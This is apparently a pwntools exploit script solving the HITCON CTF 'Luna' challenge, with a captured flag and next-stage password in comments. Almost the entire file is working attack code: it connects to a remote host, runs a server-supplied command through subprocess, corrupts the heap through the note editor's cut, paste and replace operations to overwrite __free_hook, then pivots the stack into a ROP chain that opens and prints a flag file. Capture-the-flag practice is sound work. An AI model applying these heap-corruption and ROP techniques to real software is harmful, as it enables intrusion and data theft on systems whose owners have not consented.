#!/usr/bin/env python
from pwn import *

# hitcon{achievement: Defeat Luna}

'''
hitcon{achievement: Defeat Luna}
Password for PoE II: c8ecf647f0238e24cb3f96f45c7f54e2f33578d0
'''

context.arch = 'amd64'
y = remote( '13.230.132.4' , 21700 )

def insert( idx , data ):
    y.sendlineafter( '>>> ' , 'i' )
    y.sendline( str( idx ) )
    y.sendline( data ) # 0x100

def new_tab():
    y.sendlineafter( '>>> ' , 'n' )

def select( tid ):
    y.sendlineafter( '>>> ' , 's' )
    y.sendline( str( tid ) )

def display( idx , l ):
    y.sendlineafter( '>>> ' , 'd' )
    y.sendline( str( idx ) )
    y.sendline( str( l ) )

def cut( idx , l ):
    y.sendlineafter( '>>> ' , 'c' )
    y.sendline( str( idx ) )
    y.sendline( str( l ) )

def paste( idx ):
    y.sendlineafter( '>>> ' , 'p' )
    y.sendline( str( idx ) )

def replace( idx , l  , c ):
    y.sendlineafter( '>>> ' , 'r' )
    y.sendline( str( idx ) )
    y.sendline( str( l ) )
    y.sendline( c )

def reverse( idx , l ):
    y.sendlineafter( '>>> ' , 'R' )
    y.sendline( str( idx ) )
    y.sendline( str( l ) )

def delete( idx , l ):
    y.sendlineafter( '>>> ' , 'D' )
    y.sendline( str( idx ) )
    y.sendline( str( l ) )

def wri( idx , data ):
    for i , c in enumerate( data ):
        if c == '\0':
            continue
        #print i , hex( ord( c ) )
        replace( idx + i , 1 , c )

y.recvuntil('of:\n')
cmd = y.recvline().strip()
res = subprocess.check_output(cmd.split()).strip()
print res
y.sendline( res )

y.recvuntil( 'Luna - the Legendary Ultra Note Accelerator' )

gg = 0x4c35d8 # xchg eax, edi ; xchg eax, esp ; ret
pop_rdi = 0x4006a6
ppr = 0x44d859 # pop rdx ; pop rsi ; ret
_open = 0x44a960
read = 0x44ab20
write = 0x44abf0
ret = 0x40042e

free_hook = 0x6D9E78

p = flat(
    'a' * 0x10,
    p32( 0x100 ), p32( 0 ), 0, #  size , id , freed
    free_hook , 0,
    '/home/poe/flag1\0',

    pop_rdi, 0,
    ppr , 0x200 , 0x6d93d0,
    read
).ljust( 0xd0 , 'a' )

p += flat(
    p32( 0x100 ), p32( 0 ), 0, #  size , id , freed
    0x6d9390 + 0x10
)

insert( 0 , p ) # 0
new_tab()
insert( 0 , 'a' * 0x18 ) # 1
cut( 0 , 0x18 )
select( 0 )
cut( 0 , 0xe0 )
new_tab()
paste( 0 )
new_tab() # realloc( ptr , 0x20 )

select( 2 )
replace( 0x60 , 1 , '\x70' )
replace( 0x68 , 1 , '\x30' )

select( 0 )
wri( 0 , p64( gg ) )

p = flat(
    ( pop_rdi, 0x6d9390, ppr, 0, 0, _open ) * 3, # open * 3 -> fd = 5
    pop_rdi, 5,
    ppr , 0x100 , 0x6d9360,
    read,
    pop_rdi, 1,
    write,
)

select( 1 )
insert( 0 , 'a' ) # trigger __free_hook

sleep(0.7)
y.sendline( p )

y.interactive()